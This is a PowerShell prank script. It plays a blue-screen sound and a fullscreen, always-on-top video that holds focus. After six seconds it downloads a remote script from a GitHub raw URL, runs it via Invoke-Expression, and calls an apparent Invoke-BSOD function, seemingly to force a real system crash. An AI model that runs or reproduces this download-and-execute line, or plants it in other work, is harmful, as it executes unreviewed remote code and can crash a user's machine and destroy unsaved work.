# Change directory to Music
Set-Location -Path ([Environment]::GetFolderPath("MyMusic"))


(New-Object System.Media.SoundPlayer "BlueScreen.wav").Play()
Start-Sleep -Seconds 6

# Load WPF assemblies
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel

# Define XAML for the video player window
[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowStyle="None" WindowState="Maximized" Topmost="True">
    <Grid>
        <MediaElement Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"/>
    </Grid>
</Window>
"@

# Define paths
$VideoSource = Join-Path -Path $PWD.Path -ChildPath "BlueScreen.mp4"

# Load the XAML and initialize the video player
$XAMLReader = (New-Object System.Xml.XmlNodeReader $XAML)
$Window = [Windows.Markup.XamlReader]::Load($XAMLReader)
$VideoPlayer = $Window.FindName("VideoPlayer")

# Configure video player settings
$VideoPlayer.Volume = 100
$VideoPlayer.Source = $VideoSource
$VideoPlayer.Play()

# Start the timer to close the window after 6 seconds
$Timer = New-Object System.Windows.Threading.DispatcherTimer
$Timer.Interval = [TimeSpan]::FromSeconds(6)
$Timer.Add_Tick({
    $Timer.Stop()
    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/shortcutactivation/BlueScreen/BSOD.ps1'));Invoke-BSOD
})

# Start countdown timer after the video starts playing and execute BSOD
$VideoPlayer.Add_Loaded({
    $Timer.Start()

})

# Display the window and prevent other windows from stealing focus
$Window.Topmost = $true
$Window.ShowDialog() | Out-Null
